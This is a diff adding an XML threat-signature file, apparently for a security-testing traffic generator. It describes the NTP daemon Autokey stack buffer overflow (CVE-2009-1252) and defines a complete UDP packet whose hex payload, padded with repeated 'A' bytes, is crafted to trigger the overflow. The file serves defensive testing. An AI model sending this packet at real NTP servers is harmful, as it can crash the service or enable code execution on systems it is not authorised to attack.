@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Multiple Vendors NTP Daemon Autokey Stack Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in the NTP (Network Time Protocol) daemon. The flaw is due to a boundary error when processing crafted packets sent to the daemon. An attacker could exploit this vulnerability by sending a specially crafted packet to ntpd. In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The injected code in such a case would execute within the security context of the service. In an attack case where code injection is not successful, the affected service will terminate abnormally, creating a denial of service condition."/>
+    <Intent display="true">
+      <item value="Code_Overflow/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="NTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Multiple_Vendors"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Network_Time_Protocol_Project._NTP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Network_Time_Protocol_Project._NTP_prior_to_4.2.4p7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-1252"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="1ec1daad97ac47daefd106456d1211c6"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633978744473534807"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1262169025" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="NTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+    <NamedVar name="NTPdestMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="NTPsourceMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="NTPsourcePort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="H"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="B"/>
+      <for index="I"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$NTPsourceMAC" destMac="$NTPdestMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01A8" Identification="344B" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$NTPsourcePort" destPort="$NTPdestPort" checksum="" length="0194" Payload="E40006EC000000000000015C494E49540000000000000000CDC0558A41023B79CDC05594C4575497CDC05594C459E6A6020101480000000000000000000800210000012C41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414100000000000000000B54A71B455BB2E3968A9722644217F63570ADC0"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
